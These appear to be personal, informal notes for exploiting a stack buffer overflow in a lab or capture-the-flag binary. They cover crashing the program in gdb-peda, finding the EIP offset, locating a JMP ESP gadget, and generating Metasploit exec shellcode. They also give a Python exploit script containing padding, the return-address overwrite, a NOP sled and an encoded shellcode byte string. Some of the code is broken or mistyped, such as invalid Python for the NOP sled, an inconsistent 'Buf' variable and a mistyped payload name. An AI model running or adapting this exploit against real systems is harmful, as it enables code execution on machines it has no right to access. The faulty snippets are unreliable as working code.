PART 1:

chmod +x func
./func
./func
gdb ./func 

gdb-peda$
pdisass main

EX. call 0x3d0 <gets@plt> 
pdisass gets (disassembles gets func)

run 
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
(CRASH)

Go to wiremask.eu, get the string and pase it where it says "Press enter to view inventory:" and then put the EIP in the Wiremask get offset, put the offset in script Where A * ##

on TARGET SSH SESSION, go to the directory and 
gdb ./file

CRASH

info proc map  ------------------------------------------------------------
                                                                           |
PART 2:                                                                    |
                                                                           |
env - gdb ./func                                                           |
disassemble getuserinput                                                   |
show env                                                                   |
unset env LINES                                                            |
unset env COLUMNS                                                          |
run                                                                        |
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaaaa (CRASH)
info proc map <------------------------------------------------------------|
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 (0xff = JMP in hex)             
find /b 0xf7def000, 0xfffdd000, 0xff, 0xe4                                 
SYNTAX:  ^start of stack AFTER HEAP LINE ^END OF STACK ^JMP ^0xe4 in hex   
                                            
TAKE TOP 3  HEX and convert to little indian
buf += "\x51\x1b\xdf\xf7"



Add to mybuff.py
'''
0xf7de3b59 -> \x\x59\x3b\xde\xf7 JMP ESP  (this
0xf7f588ab
0xf7f645fb
'''


lin ops > msfdb init
        > msfconsole
              > use payload/linux/x86/exec
              > show options 
              > set CMD 'the cmd you want to get the flag'
              > show options
              > generate -b '\x00' -f python (\x00 is getting rid of null bytes, which can fuck up our payload)
              copy the hex paragraph on the bottom of the page and take to script under OVERWRITE EIP REGISTER              
              > 
                  #!/usr/bin/python2.7
                  
                  #Fill Buffer
                  
                  buf = "A" * 62
                  
                  #Overwrite EIP REGISTER
                  buf += "\x59\x3b\xde\xf7"

                  # NOP SLED
                  buf += "\x90" x 10

                  #Payload
                   Buf += b"HEX PARAGRAPH"
                   Buf += b"HEX PARAGRAPH"
                   Buf += b"HEX PARAGRAPH"
                   Buf += b"HEX PARAGRAPH"
                   Buf += b"HEX PARAGRAPH"

                                Do not include the buf += b''
                                buf += b"\xd9\xc2\xd9\x74\x24\xf4\xbb\x11\xe5\x11\xfb\x5a"
                                buf += b"\x29\xc9\xb1\x11\x31\x5a\x17\x03\x5a\x17\x83\xd3"
                                buf += b"\xe1\xf3\x0e\xb9\xe2\xab\x69\x6f\x93\x23\xa7\xec"
                                buf += b"\xd2\x53\xdf\xdd\x97\xf3\x20\x49\x77\x66\x48\xe7"
                                buf += b"\x0e\x85\xd8\x1f\x0d\x4a\xdd\xdf\x4d\x2b\xa9\xff"
                                buf += b"\xbe\x85\x22\x9a\xa3\xab\xa1\x10\x0b\x62\x5c\xbd"
                                buf += b"\x21\x03\xd3\x58\xa5\x81\x76\xd6\x07\x16\x1d\x74"
                                buf += b"\x58\x81\x8e\xf1\xb9\xe0\xb1"

                  print(buf)
              

LIN -> comrade from LIN
scp -P <port for tunnel> <absolute path of file u wanna transfer> <comrade@127.0.0.1>:whereuwannago,if you dont givr a shit just give period


Lin> ./func <<<$(absolute path, use pwd for  location of mybuff.py)
Lin> msfvenom -l pinux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python
